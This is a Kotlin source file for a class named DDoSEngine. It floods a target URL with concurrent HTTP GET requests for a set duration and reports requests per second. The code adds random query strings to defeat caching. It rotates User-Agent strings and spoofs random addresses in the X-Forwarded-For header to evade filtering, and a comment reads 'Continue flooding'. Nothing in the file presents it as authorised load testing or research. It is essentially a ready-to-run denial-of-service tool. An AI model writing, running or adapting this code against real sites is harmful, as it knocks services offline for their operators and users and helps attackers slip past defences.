package com.security.ddos

import kotlinx.coroutines.*
import okhttp3.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicLong
import kotlin.random.Random

class DDoSEngine(
    private val targetUrl: String,
    private val threadCount: Int = 50,
    private val durationMs: Long = 60000,
    private val onProgressUpdate: (stats: DDoSStats) -> Unit = {}
) {
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.SECONDS)
        .writeTimeout(5, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .connectionPool(ConnectionPool(maxIdleConnections = threadCount, keepAliveDurationNs = 60_000_000_000L))
        .dispatcher(Dispatcher().apply {
            maxRequestsPerHost = threadCount
            maxRequests = threadCount * 2
        })
        .build()

    private val requestCount = AtomicLong(0)
    private val successCount = AtomicLong(0)
    private val failureCount = AtomicLong(0)
    private var isRunning = false
    private val scope = CoroutineScope(Dispatchers.Default + Job())

    suspend fun start() {
        isRunning = true
        val startTime = System.currentTimeMillis()

        val workers = List(threadCount) {
            scope.launch {
                floodRequests(startTime)
            }
        }

        // Progress update coroutine
        scope.launch {
            while (isRunning) {
                delay(1000)
                val elapsed = System.currentTimeMillis() - startTime
                val rps = if (elapsed > 0) (requestCount.get() * 1000) / elapsed else 0
                onProgressUpdate(DDoSStats(
                    totalRequests = requestCount.get(),
                    successCount = successCount.get(),
                    failureCount = failureCount.get(),
                    rps = rps,
                    elapsedSeconds = elapsed / 1000
                ))
            }
        }

        workers.joinAll()
        stop()
    }

    private suspend fun floodRequests(startTime: Long) {
        while (isRunning && (System.currentTimeMillis() - startTime) < durationMs) {
            try {
                val randomPath = buildTargetUrl()

                val request = Request.Builder()
                    .url(randomPath)
                    .get()
                    .addHeader("User-Agent", randomUserAgent())
                    .addHeader("Accept", "*/*")
                    .addHeader("Accept-Language", "en-US,en;q=0.9")
                    .addHeader("X-Forwarded-For", randomIP())
                    .addHeader("Cache-Control", "no-cache")
                    .addHeader("Connection", "keep-alive")
                    .addHeader("X-Request-ID", generateRequestId())
                    .build()

                scope.launch(Dispatchers.IO) {
                    try {
                        httpClient.newCall(request).execute().use { response ->
                            requestCount.incrementAndGet()
                            if (response.isSuccessful || response.code in 400..599) {
                                successCount.incrementAndGet()
                            } else {
                                failureCount.incrementAndGet()
                            }
                            response.body?.close()
                        }
                    } catch (e: Exception) {
                        requestCount.incrementAndGet()
                        failureCount.incrementAndGet()
                    }
                }

                delay(1)
            } catch (e: Exception) {
                // Continue flooding
            }
        }
    }

    private fun buildTargetUrl(): String {
        val baseUrl = targetUrl.split("?")[0]
        return "$baseUrl?t=${System.currentTimeMillis()}&r=${Random.nextDouble()}"
    }

    private fun randomUserAgent(): String {
        val agents = listOf(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
        )
        return agents.random()
    }

    private fun randomIP(): String {
        return "${Random.nextInt(256)}.${Random.nextInt(256)}.${Random.nextInt(256)}.${Random.nextInt(256)}"
    }

    private fun generateRequestId(): String {
        return "${System.currentTimeMillis()}-${Random.nextInt(10000)}"
    }

    fun stop() {
        isRunning = false
        scope.cancel()
        httpClient.dispatcher.cancelAll()
        httpClient.connectionPool.evictAll()
    }

    fun getStats(): DDoSStats {
        return DDoSStats(
            totalRequests = requestCount.get(),
            successCount = successCount.get(),
            failureCount = failureCount.get(),
            rps = 0,
            elapsedSeconds = 0
        )
    }
}

data class DDoSStats(
    val totalRequests: Long,
    val successCount: Long,
    val failureCount: Long,
    val rps: Long,
    val elapsedSeconds: Long
)
